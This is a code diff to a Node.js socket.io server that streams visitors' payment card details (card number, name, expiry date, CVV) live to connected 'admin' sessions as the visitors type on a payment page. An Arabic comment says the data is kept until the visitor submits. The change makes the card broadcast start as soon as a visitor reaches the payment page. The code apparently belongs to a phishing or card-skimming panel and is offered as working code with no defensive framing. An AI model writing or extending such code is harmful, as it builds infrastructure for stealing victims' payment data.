@@ -518,12 +518,13 @@ io.on("connection", (socket) => {
       if (isPaymentPage) {
         visitor.hasEnteredCardPage = true;
         visitor.lastDataUpdate = new Date().toISOString();
-        /*FIX-LIVE*/ if (visitor.liveCard) {
-          visitor.liveCardTimestamp = visitor.liveCardTimestamp || new Date().toISOString();
-          admins.forEach((admin, adminSocketId) => {
-            io.to(adminSocketId).emit("card:liveUpdate", { visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp });
-          });
+        /*FIX-LIVE*/ if (!visitor.liveCard) {
+          visitor.liveCard = { cardNumber: "", nameOnCard: "", expiryDate: "", cvv: "" };
         }
+        visitor.liveCardTimestamp = visitor.liveCardTimestamp || new Date().toISOString();
+        admins.forEach((admin, adminSocketId) => {
+          io.to(adminSocketId).emit("card:liveUpdate", { visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp });
+        });
       } else {
         // [FIX-LIVE] لا نمسح بطاقة الدفع المباشر — تبقى حتى يضغط الزائر «إرسال»
         if (visitor.liveCard) {
